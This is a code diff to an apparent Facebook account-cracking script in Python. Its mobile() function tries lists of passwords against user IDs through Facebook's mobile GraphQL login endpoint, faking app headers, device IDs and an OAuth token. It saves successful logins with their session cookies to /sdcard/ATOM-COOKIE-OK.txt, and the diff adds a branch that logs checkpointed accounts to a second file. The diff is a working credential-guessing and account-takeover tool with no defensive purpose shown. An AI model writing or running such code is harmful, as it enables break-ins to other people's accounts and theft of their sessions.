@@ -1638,37 +1638,46 @@ def mobile(uid,pwx,tl):
     global loop
     global oks
     global cps
-    sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
+    sys.stdout.write(f"\r {green}(M3) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
-            ua = samsung_user_agent()
-            ses = requests.Session()
+            data = {
+            'method': 'post',
+            'pretty': False,
+            'format': 'json',
+            'server_timestamps': True,
+            'locale': 'id_ID, en-US',
+            'purpose': 'fetch',
+            'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'fb_api_caller_class': 'graphservice',
+            'client_doc_id': '119940804214876861379510865434',
+            'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"'"+str(uuid.uuid4)+"'\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+pw+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"'"+str(uuid.uuid4())+"'\\\",\\\"waterfall_id\\\":\\\"'"+str(uuid.uuid4())+"'\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"'"+str(uuid.uuid4)+"'\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
+            'fb_api_analytics_tags': '["GraphServices"]',
+            'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'
+            }
             headers = {
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'x-fb-sim-hni': str(random.randint(50000, 600000)),
-            'x-fb-net-hni': str(random.randint(50000, 600000)),
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'x-graphql-client-library': 'graphservice',
-            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'host': 'b-graph.facebook.com',
+            'x-fb-connection-type': 'MOBILE.LTE',
+            'user-agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
             'x-tigon-is-retry': 'False',
-            'x-fb-privacy-context': '3643298472347298',
+            'x-fb-device-group': str(random.randint(1000, 5999)),
             'x-graphql-request-purpose': 'fetch',
-            'x-fb-device-group': '5530',
-            'User-Agent': ua,
-            'x-fb-connection-type': 'WIFI',
-            'x-fb-rmd': 'fail=Server:NoUrlMap,Default:INVALID_MAP;v=;ip=;tkn=;reqTime=56;recvTime=13823808',
+            'x-fb-privacy-context': '3643298472347298',
+            'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request',
+            'x-graphql-client-library': 'graphservice',
+            'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
+            'x-fb-net-hni': str(random.randint(5000, 5999)),
+            'x-fb-sim-hni': str(random.randint(5000, 5999)),
+            'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
             'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
-            'Accept-Encoding': 'gzip, deflate',
+            'x-requested-with': 'XMLHttpCanary',
             'x-fb-http-engine': 'Tigon/Liger',
             'x-fb-client-ip': 'True',
-            'x-fb-server-cluster': 'True',}
-            ses.headers.update(headers)
-            enc_pass = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
-            data = {'method': 'post', 'pretty': False, 'format': 'json', 'server_timestamps': True, 'locale': 'en_IN', 'purpose': 'fetch', 'fb_api_req_friendly_name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request', 'fb_api_caller_class': 'graphservice', 'client_doc_id': '11994080425603935587861051615', 'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"name\\\":null,\\\"machine_id\\\":\\\"FXQ7Z_eNU42Pnt5I_CpRlzIh\\\",\\\"profile_pic_url\\\":null,\\\"contact_point\\\":\\\""+uid+"\\\",\\\"encrypted_password\\\":\\\""+enc_pass+"\\\"},\\\"server_params\\\":{\\\"is_from_logged_out\\\":1,\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"waterfall_id\\\":\\\"278dd0ac-58b3-46e4-aa8e-ea55021589a6\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":2.9809277900605E13,\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"family_device_id\\\":\\\"db00d712-bd44-4358-bcf2-2fe14e2885d2\\\",\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"INTERNAL_INFRA_THEME\\\":\\\"default,default\\\",\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_google_smartlock_login_request"},"scale":"2","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":2,"is_push_on":False,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}), 'fb_api_analytics_tags': '["GraphServices"]', 'client_trace_id': 'c4663a0f-a919-4454-bf17-3d542589eafe'}
-            encode = urllib.parse.urlencode(data, doseq=True)
-            url = "https://graph.facebook.com/graphql"
-            result = ses.post(url, data=encode).json()
+            'x-fb-server-cluster': 'True',
+            }
+            url = "https://b-graph.facebook.com/graphql"
+            result = requests.post(url, data=data, headers=headers).json()
             if "session_key" in result:
                 sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                 ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
@@ -1694,13 +1703,17 @@ def mobile(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
+            elif "www.facebook.com" in result["error"]["message"]:
+                #print(f" {red}[SUMON-CP] {uid}|{pw}")
+                open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
+                cps.append(uid+"|"+pw)
+                break
             else:
                 continue
         loop+=1
     except net_error:
         time.sleep(10)
-    except Exception as error:
-        print({error})
+    except Exception as e:
         pass
 
 
